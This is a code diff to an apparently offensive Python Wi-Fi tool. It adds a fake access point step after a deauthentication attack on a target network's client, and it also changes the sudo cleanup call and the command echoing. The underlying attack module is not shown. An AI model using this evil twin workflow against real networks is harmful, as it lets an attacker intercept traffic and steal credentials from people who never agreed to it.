@@ -8,7 +8,7 @@ import attack
 
 def exit_and_cleanup(exit_code, message):
     print_regular('Perform cleanup')
-    os.system('sudo ./cleanup.sh')
+    os.system('sudo sh Templates/cleanup.sh')
     sys.exit('{} Perform exit() with exit code {} , {}'.format(Fore.WHITE, exit_code, message))
 
 
@@ -30,6 +30,7 @@ def search(word: str, text: str):
 
 
 def bash(command: str):
+    print('{} {} {}'.format(Fore.YELLOW, command, Fore.WHITE))
     return os.system(command)
 
 
@@ -83,12 +84,13 @@ def start_evil_twin_attack():
     print_regular('Network to Attack : AP Name = {}  MAC Address = {}\n'.format(ap[0], ap[1]))
     print_regular(
         'Searching for users in all channels on Network to Attack : AP Name = {}  MAC Address = {}\n'.format(ap[0],
-                                                                                                           ap[1]))
+                                                                                                             ap[1]))
     client_index = attack_obj.get_client_index(ap)
     client = attack.get_client(client_index)
     print_header('deauthentication attack')
     print_regular('Perform deauthentication attack on Client MAC Address = {} and AP Name = {}\n'.format(client, ap[1]))
     attack_obj.deauthentication_attack(client, ap[1])
+    attack_obj.create_fake_access_point(ap[0])
 
 
 def manage():
